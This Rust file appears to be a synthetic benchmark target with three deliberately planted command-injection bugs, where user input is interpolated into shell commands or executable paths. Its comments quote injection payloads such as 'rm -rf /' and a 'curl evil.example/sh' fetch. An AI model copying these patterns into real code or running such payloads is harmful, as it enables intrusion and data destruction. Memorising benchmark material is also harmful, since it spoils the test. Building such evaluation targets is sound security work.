// Synthetic Stage 0 target for tribes-bench.
// Three planted command-injection bugs at lines ~12, ~23, ~35.
// Do NOT fix the bugs — the deterministic verifier matches on signature.

use std::env;
use std::process::Command;

fn list_dir(user_arg: &str) -> std::io::Result<()> {
    // Bug ci-001: user input is concatenated into a shell command. A user
    // arg like "/tmp; rm -rf /" escapes the intended `ls` invocation and
    // executes the trailing command. Signature: format!("ls {}"
    let _ = Command::new("sh").arg("-c").arg(format!("ls {}", user_arg)).status()?;
    Ok(())
}

fn run_subcmd(subcmd: &str) -> std::io::Result<()> {
    // Bug ci-002: the binary path itself is constructed from caller-controlled
    // input. A subcmd like "../../usr/bin/curl" or "ls; touch /tmp/pwn" lets
    // the caller pick the executable on the system. Signature:
    // format!("/bin/{}", subcmd)
    let _ = Command::new(format!("/bin/{}", subcmd)).status()?;
    Ok(())
}

fn grep_pipeline(path: &str) -> std::io::Result<()> {
    // Bug ci-003: a user-supplied path is interpolated into a shell pipeline
    // string. A path like "x.txt; curl evil.example/sh" injects a second
    // command after the cat. Signature: format!("cat {} | grep ...
    let pipeline = format!("cat {} | grep ...", path);
    let _ = Command::new("bash").arg("-c").arg(pipeline).status()?;
    Ok(())
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let user_arg = args.get(1).cloned().unwrap_or_else(|| ".".to_string());
    let subcmd = args.get(2).cloned().unwrap_or_else(|| "ls".to_string());
    let path = args.get(3).cloned().unwrap_or_else(|| "README.md".to_string());

    if let Err(e) = list_dir(&user_arg) {
        eprintln!("list_dir failed: {}", e);
    }
    if let Err(e) = run_subcmd(&subcmd) {
        eprintln!("run_subcmd failed: {}", e);
    }
    if let Err(e) = grep_pipeline(&path) {
        eprintln!("grep_pipeline failed: {}", e);
    }
}
